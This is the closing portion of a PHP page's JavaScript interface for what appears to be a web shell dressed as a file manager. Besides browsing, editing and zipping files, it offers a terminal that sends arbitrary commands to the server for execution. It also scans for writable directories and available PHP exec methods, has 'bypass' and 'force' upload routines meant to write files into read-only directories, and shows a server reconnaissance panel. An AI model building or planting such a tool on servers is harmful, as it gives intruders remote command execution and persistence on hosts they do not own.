        document.getElementById('paste-btn').disabled = true;
    });
}

function pasteClipboard() {
    if (!state.clipboard) return;
    openCopyMove(state.clipboard.action, state.clipboard.targets);
}

// ---- BULK OPERATIONS ----
function getSelected() { return state.selected.toArray(); }

function bulkDelete() {
    var sel = getSelected();
    if (!sel.length) { toast('No files selected.', 'warn'); return; }
    if (!confirm('Delete ' + sel.length + ' item(s)? This cannot be undone.')) return;
    apiP({ action: 'delete', path: '', targets: JSON.stringify(sel) }).then(function(res) {
        if (res.ok) { toast('Deleted ' + sel.length + ' item(s).', 'success'); state.selected.clear(); refresh(); }
        else toast(res.msg, 'error');
    });
}

function bulkZip() {
    var sel = getSelected();
    if (!sel.length) { toast('No files selected.', 'warn'); return; }
    document.getElementById('zipname-targets').value = JSON.stringify(sel);
    document.getElementById('zipname-input').value = 'archive_' + Date.now();
    openModal('modal-zipname');
}

function bulkCopy() {
    var sel = getSelected();
    if (!sel.length) { toast('No files selected.', 'warn'); return; }
    state.clipboard = { action: 'copy', targets: sel };
    document.getElementById('paste-btn').disabled = false;
    toast(sel.length + ' item(s) copied to clipboard. Navigate and click Paste.', 'info');
}

function bulkMove() {
    var sel = getSelected();
    if (!sel.length) { toast('No files selected.', 'warn'); return; }
    openCopyMove('move', sel);
}

function doZip() {
    var targets  = document.getElementById('zipname-targets').value;
    var zipname  = document.getElementById('zipname-input').value.trim();
    if (!zipname) { toast('Enter zip name.', 'warn'); return; }
    closeModal('modal-zipname');
    apiP({ action: 'zip', path: '', targets: targets, zipname: zipname }).then(function(res) {
        if (res.ok) { toast(res.msg, 'success'); refresh(); }
        else toast(res.msg, 'error');
    });
}

// ---- PERMISSIONS ----
function openPerms(path, name) {
    document.getElementById('perms-path').value = path;
    document.getElementById('perms-filename').textContent = name;
    document.getElementById('perms-output').textContent = 'Loading...';
    openModal('modal-perms');
    apiP({ action: 'get_perms', path: path }).then(function(res) {
        document.getElementById('perms-output').textContent = res.ok ? res.data : 'Error: ' + res.msg;
    });
}

function applyPerms() {
    var path = document.getElementById('perms-path').value;
    var user = document.getElementById('perms-user').value.trim();
    var perm = document.getElementById('perms-perm').value;
    if (!user) { toast('Enter a user/group.', 'warn'); return; }
    apiP({ action: 'set_perms', path: path, user: user, perm: perm }).then(function(res) {
        document.getElementById('perms-output').textContent = res.msg;
        if (res.ok) toast('Permissions applied.', 'success');
        else toast('icacls failed.', 'error');
    });
}

// ---- UNZIP ----
function unzipFile(path, name) {
    if (!confirm('Extract "' + name + '"?')) return;
    apiP({ action: 'unzip', path: path }).then(function(res) {
        if (res.ok) { toast(res.msg, 'success'); refresh(); }
        else toast(res.msg, 'error');
    });
}

// ---- SEARCH ----
function openSearch() {
    openModal('modal-search');
    setTimeout(function() { document.getElementById('search-query').focus(); }, 100);
}

function doSearch() {
    var query = document.getElementById('search-query').value.trim();
    if (!query) { toast('Enter a search query.', 'warn'); return; }
    var searchContent = document.getElementById('search-content').checked ? '1' : '0';
    document.getElementById('search-status').textContent = 'Searching...';
    document.getElementById('search-results').innerHTML = '<div class="loading">Searching recursively...</div>';
    apiP({ action: 'search', path: state.path, query: query, search_content: searchContent }).then(function(res) {
        if (!res.ok) { document.getElementById('search-status').textContent = 'Error: ' + res.msg; return; }
        document.getElementById('search-status').textContent = 'Found ' + res.count + ' result(s)' + (res.count >= 500 ? ' (limit 500)' : '');
        renderSearchResults(res.data);
    });
}

function renderSearchResults(results) {
    var el = document.getElementById('search-results');
    if (!results.length) {
        el.innerHTML = '<div class="empty-state"><div class="es-icon">&#x1F50D;</div><div>No results found</div></div>';
        return;
    }
    el.innerHTML = results.map(function(r) {
        var navPath = r.is_dir ? r.path : r.path.replace(/[^\\\/]*$/, '').replace(/[\\/]+$/, '');
        return '<div class="search-result-item" onclick="FM.navTo(\'' + navPath.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\')">' +
            '<span class="sr-icon">' + (r.is_dir ? '&#x1F4C1;' : '&#x1F4C4;') + '</span>' +
            '<div class="sr-info">' +
            '<div class="sr-name">' + escHtml(r.name) + '</div>' +
            '<div class="sr-path">' + escHtml(r.path) + '</div>' +
            '</div>' +
            (r.content_match ? '<span class="sr-badge">CONTENT</span>' : '') +
            '<span style="color:var(--muted);font-size:11px">' + (r.is_dir ? '' : fmtSize(r.size)) + '</span>' +
            '</div>';
    }).join('');
}

// ---- TERMINAL ----
function openTerminal() {
    openModal('modal-terminal');
    setTimeout(function() { document.getElementById('terminal-input').focus(); }, 100);
}

function terminalKey(e) {
    if (e.key === 'Enter') {
        execCmd();
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (state.termHistIdx < state.termHistory.length - 1) {
            state.termHistIdx++;
            document.getElementById('terminal-input').value = state.termHistory[state.termHistory.length - 1 - state.termHistIdx] || '';
        }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (state.termHistIdx > 0) {
            state.termHistIdx--;
            document.getElementById('terminal-input').value = state.termHistory[state.termHistory.length - 1 - state.termHistIdx] || '';
        } else {
            state.termHistIdx = -1;
            document.getElementById('terminal-input').value = '';
        }
    }
}

function execCmd() {
    var inp = document.getElementById('terminal-input');
    var cmd = inp.value.trim();
    if (!cmd) return;
    state.termHistory.push(cmd);
    state.termHistIdx = -1;
    inp.value = '';
    var out = document.getElementById('terminal-output');
    out.innerHTML += '\n<span class="terminal-prompt">' + escHtml(state.path || '/') + '&gt;</span> <span style="color:#fff">' + escHtml(cmd) + '</span>\n';
    apiP({ action: 'exec', cmd: cmd, path: state.path }).then(function(res) {
        if (res.ok) {
            out.innerHTML += escHtml(res.output || '(no output)') + '\n';
        } else {
            out.innerHTML += '<span class="terminal-error">Error: ' + escHtml(res.msg) + '</span>\n';
        }
        out.scrollTop = out.scrollHeight;
    });
}

function clearTerminal() {
    document.getElementById('terminal-output').innerHTML = '<span class="terminal-prompt">Terminal cleared.</span>\n';
}

// ---- WRITABLE DIRS ----
function openWritableDirs() {
    openModal('modal-wdirs');
    scanWritableDirs();
    scanExecMethods();
}

function wdTab(btn, tabId) {
    var bar = btn.parentNode;
    var panes = bar.parentNode.querySelectorAll('.tab-pane');
    var btns = bar.querySelectorAll('.tab-btn');
    btns.forEach(function(b) { b.classList.remove('active'); });
    panes.forEach(function(p) { p.classList.remove('active'); });
    btn.classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

function scanWritableDirs() {
    var msg = document.getElementById('wdirs-scan-msg');
    var wrap = document.getElementById('wdirs-table-wrap');
    msg.textContent = 'Scanning...';
    wrap.innerHTML = '<div class="loading">Scanning directories...</div>';
    apiP({ action: 'writable_dirs' }).then(function(res) {
        if (!res.ok) { msg.textContent = 'Error: ' + res.msg; wrap.innerHTML = ''; return; }
        var dirs = res.data;
        var wrCount = 0;
        dirs.forEach(function(d) { if (d.writable) wrCount++; });
        msg.textContent = 'Found ' + wrCount + ' writable director' + (wrCount === 1 ? 'y' : 'ies') + ' out of ' + dirs.length + ' scanned.';
        var html = '<table class="wd-table"><thead><tr>' +
            '<th>Path</th><th>Status</th><th>Exists</th><th>Readable</th><th>PHP is_writable()</th><th>Action</th>' +
            '</tr></thead><tbody>';
        dirs.forEach(function(d) {
            var st = d.status.toLowerCase().replace(/[^a-z]/g, '');
            var badgeCls = st === 'writable' ? 'writable' : (st === 'readonly' ? 'readonly' : (st === 'exists' ? 'exists' : 'notfound'));
            var pathEsc = d.path.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
            var actionHtml = '';
            if (d.exists) {
                actionHtml += '<button class="wd-use-btn" onclick="FM.navTo(\'' + pathEsc + '\')">&#x1F4C2; Browse</button> ';
                // Upload Here works on ALL directories (not just writable)
                actionHtml += '<button class="wd-use-btn" onclick="FM.setUploadDir(\'' + pathEsc + '\')">&#x2B06; Upload Here</button> ';
                // Force Upload button for READ-ONLY directories
                if (!d.writable) {
                    actionHtml += '<button class="wd-use-btn wd-force-btn" onclick="FM.forceUploadToDir(\'' + pathEsc + '\')">&#x26A1; Force Upload</button>';
                }
            }
            html += '<tr>' +
                '<td style="font-family:Consolas,monospace;font-size:11px">' + escHtml(d.path) + '</td>' +
                '<td><span class="wd-badge ' + badgeCls + '">' + escHtml(d.status) + '</span></td>' +
                '<td style="text-align:center">' + (d.exists ? '<span style="color:var(--success)">&#x2714;</span>' : '<span style="color:var(--danger)">&#x2718;</span>') + '</td>' +
                '<td style="text-align:center">' + (d.readable ? '<span style="color:var(--success)">&#x2714;</span>' : '<span style="color:var(--danger)">&#x2718;</span>') + '</td>' +
                '<td style="text-align:center">' + (d.php_writable ? '<span style="color:var(--success)">&#x2714;</span>' : '<span style="color:var(--danger)">&#x2718;</span>') + '</td>' +
                '<td>' + actionHtml + '</td></tr>';
        });
        html += '</tbody></table>';
        wrap.innerHTML = html;
    });
}

function setUploadDir(path) {
    state.path = path;
    document.getElementById('path-input').value = path;
    updateBreadcrumb(path);
    closeModal('modal-wdirs');
    openUpload();
    toast('Upload directory set to: ' + path, 'info');
}

function scanExecMethods() {
    var wrap = document.getElementById('exec-methods-wrap');
    wrap.innerHTML = '<div class="loading">Detecting...</div>';
    apiP({ action: 'exec_methods' }).then(function(res) {
        if (!res.ok) { wrap.innerHTML = '<div class="loading">Error: ' + escHtml(res.msg) + '</div>'; return; }
        var methods = res.data;
        var avail = 0;
        var keys = Object.keys ? Object.keys(methods) : (function() { var k=[]; for (var p in methods) { if(methods.hasOwnProperty(p)) k.push(p); } return k; })();
        keys.forEach(function(k) { if (methods[k]) avail++; });
        var summary = '<p style="font-size:12px;color:var(--muted);margin-bottom:10px">' + avail + ' / ' + keys.length + ' exec methods available.</p>';
        var html = summary + '<div class="exec-method-grid">';
        keys.forEach(function(k) {
            var ok = methods[k];
            html += '<div class="em-card">' +
                '<span class="em-name">' + escHtml(k) + '</span>' +
                '<span class="em-status ' + (ok ? 'avail' : 'disabled') + '">' + (ok ? 'AVAILABLE' : 'DISABLED') + '</span>' +
                '</div>';
        });
        html += '</div>';
        wrap.innerHTML = html;
    });
}

// ---- BYPASS UPLOAD ----
function openBypassUpload() {
    openModal('modal-wdirs');
    var bar = document.querySelector('#modal-wdirs .tab-bar');
    var panes = document.querySelectorAll('#modal-wdirs .tab-pane');
    var btns = bar ? bar.querySelectorAll('.tab-btn') : [];
    for (var i = 0; i < btns.length; i++) btns[i].classList.remove('active');
    for (var j = 0; j < panes.length; j++) panes[j].classList.remove('active');
    var bypassBtn = btns[2] || null;
    if (bypassBtn) bypassBtn.classList.add('active');
    var bypassPane = document.getElementById('wd-tab-bypass');
    if (bypassPane) bypassPane.classList.add('active');
    document.getElementById('bypass-dest-path').value = state.path || '';
}

function setBypassPathToCurrent() {
    document.getElementById('bypass-dest-path').value = state.path || '';
}

function doBypassUpload() {
    var fileInput = document.getElementById('bypass-file-input');
    var destPath  = document.getElementById('bypass-dest-path').value.trim();
    var overrideName = document.getElementById('bypass-filename').value.trim();
    var resultEl  = document.getElementById('bypass-upload-result');
    if (!fileInput.files || !fileInput.files.length) {
        toast('Select a file first.', 'warn');
        return;
    }
    var file = fileInput.files[0];
    var fname = overrideName || file.name;
    resultEl.innerHTML = '<span style="color:var(--warn)">Reading file...</span>';
    var reader = new FileReader();
    reader.onload = function(e2) {
        var ab = e2.target.result;
        var bytes = new Uint8Array(ab);
        var binary = '';
        for (var bi = 0; bi < bytes.byteLength; bi++) {
            binary += String.fromCharCode(bytes[bi]);
        }
        var b64 = btoa(binary);
        resultEl.innerHTML = '<span style="color:var(--warn)">Uploading via bypass (' + escHtml(fname) + ')...</span>';
        apiP({
            action: 'upload_bypass',
            path: destPath,
            filename: fname,
            b64content: b64
        }).then(function(res) {
            if (res.ok) {
                resultEl.innerHTML = '<span style="color:var(--success)">&#x2714; ' + escHtml(res.msg) + '</span>' +
                    (res.path ? '<br><span style="font-size:11px;color:var(--muted);font-family:Consolas,monospace">' + escHtml(res.path) + '</span>' : '');
                toast('Bypass upload success: ' + res.msg, 'success');
                refresh();
            } else {
                resultEl.innerHTML = '<span style="color:var(--danger)">&#x2718; ' + escHtml(res.msg) + '</span>';
                toast('Bypass upload failed: ' + res.msg, 'error');
            }
        });
    };
    reader.onerror = function() {
        resultEl.innerHTML = '<span style="color:var(--danger)">Failed to read file.</span>';
    };
    reader.readAsArrayBuffer(file);
}

// ---- FORCE UPLOAD ----
function forceUploadToDir(dirPath) {
    openModal('modal-wdirs');
    var bar = document.querySelector('#modal-wdirs .tab-bar');
    var panes = document.querySelectorAll('#modal-wdirs .tab-pane');
    var btns = bar ? bar.querySelectorAll('.tab-btn') : [];
    for (var i = 0; i < btns.length; i++) btns[i].classList.remove('active');
    for (var j = 0; j < panes.length; j++) panes[j].classList.remove('active');
    // Activate Force Upload tab (4th tab, index 3)
    var forceBtn = btns[3] || null;
    if (forceBtn) forceBtn.classList.add('active');
    var forcePane = document.getElementById('wd-tab-force');
    if (forcePane) forcePane.classList.add('active');
    document.getElementById('force-dest-path').value = dirPath;
    document.getElementById('force-upload-log').innerHTML = '';
}

function setForcePathToCurrent() {
    document.getElementById('force-dest-path').value = state.path || '';
}

function renderForceLog(logEntries) {
    var logEl = document.getElementById('force-upload-log');
    if (!logEntries || !logEntries.length) {
        logEl.innerHTML = '<div style="color:var(--muted);font-size:12px">No log entries.</div>';
        return;
    }
    var html = '<div class="force-log">';
    html += '<div class="force-log-header">Method Log (' + logEntries.length + ' attempts)</div>';
    logEntries.forEach(function(entry) {
        var icon = entry.ok ? '<span style="color:var(--success)">&#x2714;</span>' : '<span style="color:var(--danger)">&#x2718;</span>';
        var cls = entry.ok ? 'log-ok' : 'log-fail';
        html += '<div class="force-log-entry ' + cls + '">' +
            icon + ' <strong>' + escHtml(entry.method) + '</strong> — ' + escHtml(entry.msg) +
            '</div>';
    });
    html += '</div>';
    logEl.innerHTML = html;
}

function doForceUpload(mode) {
    var fileInput = document.getElementById('force-file-input');
    var destPath  = document.getElementById('force-dest-path').value.trim();
    var overrideName = document.getElementById('force-filename').value.trim();
    var logEl = document.getElementById('force-upload-log');

    if (!destPath) {
        toast('Enter a target directory.', 'warn');
        return;
    }
    if (!fileInput.files || !fileInput.files.length) {
        toast('Select a file first.', 'warn');
        return;
    }

    var file = fileInput.files[0];
    var fname = overrideName || file.name;
    logEl.innerHTML = '<div style="color:var(--warn);font-size:12px">&#x26A1; Force uploading to: ' + escHtml(destPath) + '\\' + escHtml(fname) + ' ...</div>';

    if (mode === 'base64') {
        // Base64-based force upload
        var reader = new FileReader();
        reader.onload = function(e2) {
            var ab = e2.target.result;
            var bytes = new Uint8Array(ab);
            var binary = '';
            for (var bi = 0; bi < bytes.byteLength; bi++) {
                binary += String.fromCharCode(bytes[bi]);
            }
            var b64 = btoa(binary);
            logEl.innerHTML += '<div style="color:var(--muted);font-size:11px">File read as base64 (' + fmtSize(binary.length) + '), sending force upload...</div>';
            apiP({
                action: 'force_upload',
                path: destPath,
                filename: fname,
                b64content: b64
            }).then(function(res) {
                handleForceResult(res, destPath, fname);
            });
        };
        reader.onerror = function() {
            logEl.innerHTML += '<div style="color:var(--danger)">Failed to read file.</div>';
        };
        reader.readAsArrayBuffer(file);
    } else {
        // File-based force upload via FormData
        var fd = new FormData();
        fd.append('action', 'force_upload');
        fd.append('path', destPath);
        fd.append('files', file);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', location.pathname, true);
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        logEl.innerHTML += '<div style="color:var(--muted);font-size:11px">Sending file via FormData, awaiting force upload response...</div>';
        xhr.onload = function() {
            try {
                var res = JSON.parse(xhr.responseText);
                handleForceResult(res, destPath, fname);
            } catch(e) {
                logEl.innerHTML += '<div style="color:var(--danger)">Parse error: ' + escHtml(xhr.responseText.substring(0, 200)) + '</div>';
            }
        };
        xhr.onerror = function() {
            logEl.innerHTML += '<div style="color:var(--danger)">XHR error during force upload.</div>';
        };
        xhr.send(fd);
    }
}

function handleForceResult(res, destPath, fname) {
    var logEl = document.getElementById('force-upload-log');
    if (res.ok && res.data) {
        var found = false;
        res.data.forEach(function(item) {
            if (item.log && item.log.length) {
                renderForceLog(item.log);
            }
            if (item.ok) {
                found = true;
                toast('Force upload SUCCESS: ' + item.msg, 'success');
                refresh();
            }
        });
        if (!found) {
            var allLogs = [];
            res.data.forEach(function(item) {
                if (item.log) allLogs = allLogs.concat(item.log);
            });
            renderForceLog(allLogs);
            toast('Force upload failed — all methods exhausted.', 'error');
        }
    } else {
        logEl.innerHTML += '<div style="color:var(--danger)">&#x2718; ' + escHtml(res.msg || 'Unknown error') + '</div>';
        toast('Force upload failed: ' + (res.msg || 'Unknown error'), 'error');
    }
}

// ---- SERVER INFO ----
function openServerInfo() {
    openModal('modal-serverinfo');
    document.getElementById('serverinfo-body').innerHTML = '<div class="loading">Loading...</div>';
    apiP({ action: 'serverinfo' }).then(function(res) {
        if (!res.ok) { document.getElementById('serverinfo-body').innerHTML = '<div class="loading">Error loading info.</div>'; return; }
        renderServerInfo(res.info, res.disks);
    });
}

function renderServerInfo(info, disks) {
    var diskHtml = disks.map(function(d) {
        var cls = d.pct >= 90 ? 'danger' : d.pct >= 70 ? 'warn' : '';
        return '<div style="margin-bottom:10px">' +
            '<div class="info-row"><span class="ik">' + escHtml(d.drive) + '</span><span class="iv">' + fmtSize(d.used) + ' / ' + fmtSize(d.total) + ' (' + d.pct + '%)</span></div>' +
            '<div class="disk-bar"><div class="disk-bar-fill ' + cls + '" style="width:' + d.pct + '%"></div></div>' +
            '</div>';
    }).join('');

    document.getElementById('serverinfo-body').innerHTML =
        '<div class="info-grid">' +
        '<div class="info-card"><h4>&#x1F5A5; System</h4>' +
        '<div class="info-row"><span class="ik">OS</span><span class="iv">' + escHtml(info.os) + '</span></div>' +
        '<div class="info-row"><span class="ik">Version</span><span class="iv">' + escHtml(info.uname) + '</span></div>' +
        '<div class="info-row"><span class="ik">Hostname</span><span class="iv">' + escHtml(info.hostname) + '</span></div>' +
        '<div class="info-row"><span class="ik">IP</span><span class="iv">' + escHtml(info.ip) + '</span></div>' +
        '<div class="info-row"><span class="ik">Server</span><span class="iv">' + escHtml(info.server_soft) + '</span></div>' +
        '<div class="info-row"><span class="ik">Doc Root</span><span class="iv">' + escHtml(info.doc_root) + '</span></div>' +
        '</div>' +
        '<div class="info-card"><h4>&#x1F418; PHP</h4>' +
        '<div class="info-row"><span class="ik">Version</span><span class="iv">' + escHtml(info.php_version) + '</span></div>' +
        '<div class="info-row"><span class="ik">SAPI</span><span class="iv">' + escHtml(info.sapi) + '</span></div>' +
        '<div class="info-row"><span class="ik">Upload Max</span><span class="iv">' + escHtml(info.max_upload) + '</span></div>' +
        '<div class="info-row"><span class="ik">Post Max</span><span class="iv">' + escHtml(info.post_max) + '</span></div>' +
        '<div class="info-row"><span class="ik">Memory</span><span class="iv">' + escHtml(info.memory_limit) + '</span></div>' +
        '<div class="info-row"><span class="ik">Time Limit</span><span class="iv">' + escHtml(info.time_limit) + 's</span></div>' +
        '<div class="info-row"><span class="ik">Script</span><span class="iv" style="font-size:10px">' + escHtml(info.script) + '</span></div>' +
        '</div>' +
        '<div class="info-card" style="grid-column:1/-1"><h4>&#x1F4BE; Disk Space</h4>' + diskHtml + '</div>' +
        '<div class="info-card" style="grid-column:1/-1"><h4>&#x1F50C; Loaded Extensions</h4>' +
        '<div style="color:var(--muted);font-size:11px;line-height:1.8;word-break:break-all">' + escHtml(info.extensions) + '</div>' +
        '</div></div>';
}

// ---- MODAL HELPERS ----
function openModal(id) {
    document.getElementById(id).classList.remove('hidden');
}
function closeModal(id) {
    document.getElementById(id).classList.add('hidden');
}

// Close modal on overlay click
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('modal-overlay')) {
        e.target.classList.add('hidden');
    }
});
// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal-overlay:not(.hidden)').forEach(function(m) { m.classList.add('hidden'); });
    }
    if (e.key === 'F5' && !e.target.matches('input,textarea')) {
        e.preventDefault(); refresh();
    }
});

// ---- TOAST ----
function toast(msg, type) {
    if (!type) type = 'info';
    var icons = { success: '\u2705', error: '\u274C', warn: '\u26A0\uFE0F', info: '\u2139\uFE0F' };
    var el = document.createElement('div');
    el.className = 'toast ' + type;
    el.innerHTML = '<span>' + (icons[type] || '\u2139\uFE0F') + '</span><span>' + escHtml(String(msg)) + '</span>';
    document.getElementById('toast-container').appendChild(el);
    setTimeout(function() {
        el.style.opacity = '0';
        el.style.transition = 'opacity .3s';
        setTimeout(function() { el.parentNode && el.parentNode.removeChild(el); }, 300);
    }, 4000);
}

// ---- HELPERS ----
function fmtSize(b) {
    b = Number(b);
    if (b < 1024) return b + ' B';
    if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
    if (b < 1073741824) return (b/1048576).toFixed(1) + ' MB';
    return (b/1073741824).toFixed(2) + ' GB';
}

function fmtDate(ts) {
    if (!ts) return '\u2014';
    var d = new Date(ts * 1000);
    return d.toISOString().replace('T', ' ').slice(0, 19);
}

function escHtml(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;');
}
function escAttr(s) {
    return String(s).replace(/"/g,'&quot;').replace(/'/g,'&#039;');
}

function isTextFile(name) {
    var exts = ['txt','php','html','htm','css','js','json','xml','csv','log','ini','conf','htaccess','sql','md','yaml','yml','sh','bat','cmd','py','rb','java','c','cpp','h','ts','tsx','jsx','vue','env','gitignore','sass','scss','less','toml','rs','go','pl'];
    var ext = name.split('.').pop().toLowerCase();
    return exts.indexOf(ext) !== -1;
}
function isImageFile(name) {
    var exts = ['jpg','jpeg','png','gif','bmp','webp','svg','ico'];
    return exts.indexOf(name.split('.').pop().toLowerCase()) !== -1;
}

// Expose public methods
return {
    init: init, navTo: navTo, goUp: goUp, refresh: refresh, sortBy: sortBy,
    toggleSelectAll: toggleSelectAll, onRowCheck: onRowCheck, toggleHidden: toggleHidden,
    openUpload: openUpload, onDragOver: onDragOver, onDragLeave: onDragLeave, onDrop: onDrop,
    uploadFiles: uploadFiles, downloadFile: downloadFile,
    openFile: openFile, openEditor: openEditor, saveFile: saveFile,
    openNewFile: openNewFile, createFile: createFile,
    openNewFolder: openNewFolder, createFolder: createFolder,
    openRename: openRename, doRename: doRename, deleteItem: deleteItem,
    openCopyMove: openCopyMove, doCopyMove: doCopyMove, pasteClipboard: pasteClipboard,
    bulkDelete: bulkDelete, bulkZip: bulkZip, bulkCopy: bulkCopy, bulkMove: bulkMove, doZip: doZip,
    openPerms: openPerms, applyPerms: applyPerms, unzipFile: unzipFile,
    openSearch: openSearch, doSearch: doSearch,
    openTerminal: openTerminal, execCmd: execCmd, clearTerminal: clearTerminal, terminalKey: terminalKey,
    openServerInfo: openServerInfo, openModal: openModal, closeModal: closeModal, toast: toast,
    openWritableDirs: openWritableDirs, wdTab: wdTab, scanWritableDirs: scanWritableDirs,
    setUploadDir: setUploadDir, scanExecMethods: scanExecMethods,
    openBypassUpload: openBypassUpload, setBypassPathToCurrent: setBypassPathToCurrent, doBypassUpload: doBypassUpload,
    forceUploadToDir: forceUploadToDir, setForcePathToCurrent: setForcePathToCurrent, doForceUpload: doForceUpload,
};
})();

window.addEventListener('DOMContentLoaded', FM.init);
</script>
</body>
</html>
<?php
}
